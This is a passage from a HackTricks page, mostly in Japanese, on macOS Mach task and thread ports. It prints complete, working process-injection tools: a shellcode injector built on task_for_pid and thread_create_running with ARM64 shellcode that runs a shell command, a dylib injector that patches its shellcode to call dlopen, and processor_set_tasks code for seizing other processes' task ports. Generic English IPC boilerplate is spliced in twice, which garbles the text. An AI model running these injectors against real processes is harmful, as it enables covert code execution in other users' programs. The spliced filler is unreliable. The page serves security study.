スレッドにも関連付けられたポートがあり、**`task_threads`**を呼び出すタスクと`processor_set_threads`からプロセッサが見えます。スレッドポートへのSEND権を持つと、`thread_act`サブシステムの関数を使用できます：

* `thread_terminate`
* `thread_[get/set]_state`
* `act_[get/set]_state`
* `thread_[suspend/resume]`
* `thread_info`
* ...

どのスレッドも、**`mach_thread_sef`**に呼び出すことでこのポートを取得できます。

### タスクポートを介したスレッドへのシェルコードインジェクション

シェルコードを取得できます：

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}エンタイトルメント.plist{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**前のプログラムをコンパイル**し、同じユーザーでコードをインジェクトできるように**権限**を追加します（そうでない場合は**sudo**を使用する必要があります）。

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>  

### macOS IPC (Inter-Process Communication)

#### macOS IPC Overview

Inter-process communication (IPC) mechanisms on macOS allow processes to communicate and share data with each other. There are various IPC mechanisms available on macOS, including Mach ports, XPC services, and UNIX domain sockets. Understanding how these mechanisms work is crucial for both legitimate application development and security research.

#### macOS IPC Security Considerations

When designing and implementing IPC mechanisms in macOS applications, security considerations must be taken into account to prevent unauthorized access and data leakage. Proper authentication, encryption, and access control mechanisms should be implemented to ensure the confidentiality and integrity of the data exchanged between processes.

#### macOS IPC Abuse Techniques

Malicious actors can abuse IPC mechanisms on macOS to escalate privileges, bypass security controls, and facilitate lateral movement within a compromised system. By exploiting vulnerabilities in IPC implementations or misconfigurations in application code, attackers can gain unauthorized access to sensitive data or execute arbitrary code with elevated privileges.

#### macOS IPC Hardening Recommendations

To protect against IPC abuse and enhance the security of macOS applications, developers and system administrators should follow best practices such as:

- Implementing strong authentication and authorization mechanisms for IPC communications.
- Enforcing data encryption for sensitive information exchanged between processes.
- Restricting access to IPC endpoints based on the principle of least privilege.
- Regularly auditing and monitoring IPC activity for signs of anomalous behavior or potential security incidents.

By hardening IPC implementations and configurations, organizations can reduce the risk of privilege escalation and data compromise through inter-process communication channels on macOS.
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
iOSでこれを動作させるには、書き込み可能なメモリを実行可能にするために、`dynamic-codesigning`の権限が必要です。
{% endhint %}

### タスクポートを介したスレッドへのDylibインジェクション

macOSでは、**スレッド**は**Mach**を介して操作されるか、**posix `pthread` api**を使用して操作される可能性があります。前のインジェクションで生成したスレッドは、Mach apiを使用して生成されたため、**posixに準拠していません**。

単純なシェルコードをインジェクトしてコマンドを実行することが可能でしたが、これは**posixに準拠する必要がなかった**ため、Machだけで動作しました。**より複雑なインジェクション**を行うには、スレッドも**posixに準拠する必要があります**。

したがって、スレッドを**改善する**ためには、**`pthread_create_from_mach_thread`**を呼び出すべきです。これにより、有効なpthreadが作成されます。その後、この新しいpthreadは**dlopenを呼び出して**システムからdylibを**ロード**できるため、異なるアクションを実行するための新しいシェルコードを書く代わりに、カスタムライブラリをロードすることが可能です。

例えば、（ログを生成し、それを聞くことができるものなど）**例のdylibs**を以下で見つけることができます：

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"リモートスレッドのコードのメモリアクセス権を設定できません: エラー %s\n", mach_error_string(kr));
return (-4);
}

// 割り当てられたスタックメモリの権限を設定
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"リモートスレッドのスタックのメモリアクセス権を設定できません: エラー %s\n", mach_error_string(kr));
return (-4);
}


// シェルコードを実行するスレッドを作成
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // これが実際のスタック
//remoteStack64 -= 8;  // 16のアライメントが必要

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("リモートスタック 64  0x%llx, リモートコードは %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"リモートスレッドを作成できません: エラー %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "使用法: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: ディスク上の dylib へのパス\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib が見つかりません\n");
}

}
```
</details>  

### macOS IPC (Inter-Process Communication)  

#### macOS IPC Overview  
Inter-Process Communication (IPC) mechanisms are commonly used in macOS for communication between processes. Understanding how IPC works is crucial for identifying potential security vulnerabilities and privilege escalation opportunities.  

#### macOS IPC Techniques  
1. **XPC Services**: XPC Services are a common IPC mechanism used in macOS applications. By analyzing XPC Services, attackers can identify potential weaknesses to exploit.  
2. **Mach Messages**: Mach Messages are low-level IPC mechanisms that can be abused for privilege escalation. Understanding how Mach Messages work is essential for identifying and exploiting vulnerabilities.  
3. **Distributed Objects**: Distributed Objects is another IPC mechanism in macOS that can be targeted by attackers for privilege escalation. Analyzing Distributed Objects communication can reveal potential security flaws.  

By gaining a deep understanding of macOS IPC mechanisms and how they can be abused, security researchers and penetration testers can effectively assess the security posture of macOS applications and systems.
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### タスクポートを介したスレッドハイジャッキング <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

このテクニックでは、プロセスのスレッドがハイジャックされます:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

### タスクポートインジェクションの検出

`task_for_pid` または `thread_create_*` を呼び出すと、カーネル内の構造体タスク内のカウンタが増加し、ユーザーモードから `task_info(task, TASK_EXTMOD_INFO, ...)` を呼び出すことでアクセスできます。

## 例外ポート

スレッドで例外が発生すると、この例外はスレッドの指定された例外ポートに送信されます。スレッドがそれを処理しない場合、タスク例外ポートに送信されます。タスクがそれを処理しない場合、それは launchd によって管理されるホストポートに送信されます（そこで確認されます）。これは例外トリアージと呼ばれます。

通常、最終的には適切に処理されない場合、レポートは ReportCrash デーモンによって処理されます。ただし、同じタスク内の別のスレッドが例外を処理することが可能であり、これが `PLCrashReporter` のようなクラッシュレポートツールが行うことです。

## その他のオブジェクト

### クロック

どのユーザーでもクロックに関する情報にアクセスできますが、時間を設定したり他の設定を変更するには root 権限が必要です。

情報を取得するためには、`clock` サブシステムから `clock_get_time`、`clock_get_attributtes`、`clock_alarm` のような関数を呼び出すことが可能です。\
値を変更するためには、`clock_priv` サブシステムを使用して `clock_set_time` や `clock_set_attributes` のような関数を使用できます。

### プロセッサとプロセッサセット

プロセッサ API は、`processor_start`、`processor_exit`、`processor_info`、`processor_get_assignment` などの関数を呼び出すことで単一の論理プロセッサを制御することを可能にします。

さらに、**プロセッサセット** API は、複数のプロセッサをグループ化する方法を提供します。デフォルトのプロセッサセットを取得するには **`processor_set_default`** を呼び出すことが可能です。\
これらはプロセッサセットとやり取りするためのいくつかの興味深い API です:

* `processor_set_statistics`
* `processor_set_tasks`: プロセッサセット内のすべてのタスクへの送信権限の配列を返します
* `processor_set_threads`: プロセッサセット内のすべてのスレッドへの送信権限の配列を返します
* `processor_set_stack_usage`
* `processor_set_info`

[**この投稿**](https://reverse.put.as/2014/05/05/about-the-processor\_set\_tasks-access-to-kernel-memory-vulnerability/) で述べられているように、過去にはこれにより、以前に言及した保護をバイパスして他のプロセス内のタスクポートを取得して制御することが可能でした。\
現在では、その関数を使用するには root 権限が必要であり、これは保護されているため、保護されていないプロセスでのみこれらのポートを取得できます。

以下で試すことができます:

<details>

<summary><strong>processor_set_tasks コード</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
* [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
